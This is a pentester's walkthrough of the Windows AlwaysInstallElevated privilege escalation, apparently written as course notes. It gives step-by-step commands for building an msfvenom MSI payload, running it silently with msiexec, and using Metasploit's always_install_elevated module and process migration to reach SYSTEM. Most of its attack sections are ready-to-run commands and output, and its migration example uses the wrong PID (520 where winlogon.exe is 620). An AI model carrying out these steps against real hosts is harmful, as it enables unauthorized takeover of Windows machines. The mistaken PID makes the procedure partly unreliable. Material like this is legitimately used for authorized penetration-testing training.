# AlwaysInstallElevated Exploitation

## Target requirements

- The target needs to have those values in the registry: 
  - In `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer` with the AlwaysInstallElevated set to 1
  - In `Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer` with the AlwaysInstallElevated set to 1
This means that installation packages are installed with elevated privileges 

## Exploitation

- You should have a shell with covenant or metasploit or netcat.  
We will use Covenant and Metasploit here.

### Covenant

#### Enumerate with SharpUp audit

- In your shell type `SharpUp audit`
- In the results you should see this:
  ```
  === AlwaysInstallElevated Registry Keys ===

    HKLM:    1
    HKCU:    1
  ```

#### Enumerate with powerup

- In the shell we will type PowerShellImport, type enter and fetch PoweUp.ps1 (if you do not have it you can get it [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) )  
- Click on execute
- Type `powershell invoke-allchecks` in your shell
- We should see this
  ```
  [*] Checking for AlwaysInstallElevated registry key...
  AbuseFunction : Write-UserAddMSI

  ```

#### Exploitation

- generate a payload with msfvenom `msfvenom -p windows/exec CMD="" -f msi -o exploitalwaysinstalled.msi` between the quotes put copy and paste an encoded launcher.
- Upload your file in the target using Upload command from covenant (type `Upload` and enter, file the file path for the target and browse to the file in your attack machine)
- run it using `shell msiexec /quiet /qn /i exploitalwaysinstalled.msi
- We should get a prompt for another reverse shell in our grunts as an elevated user
  ```
  > whoami
  NT AUTHORITY\SYSTEM
  ```

### Metasploit

- Interact with a session you should already have from initial foothold `sessions -i num-of-session`

#### Enumerate

- Launch `run post/multi/recon/local_exploit_suggester`
- You should see: `- exploit/windows/local/always_install_elevated: The target is vulnerable.`

#### Exploitation

- Background your session with ctrl z
- Type `use exploit/windows/local/always_install_elevated`
- set session to the number of the session you have on your target 
- type `exploit -j`
- list the sessions you should have another one running as authority system
- type ps and look for a process under session 1 so that we can migrate to it 
- We can use winlogon.exe ` 620   520   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe`
- Migrate to it using `migrate PID-number` in our example it is going to be `migrate 520`

## Resources

{% embed url="https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers" %} TCM security Academy -  Movement pivoting and persistence for pentesters and ethical hacker {% endembed %}
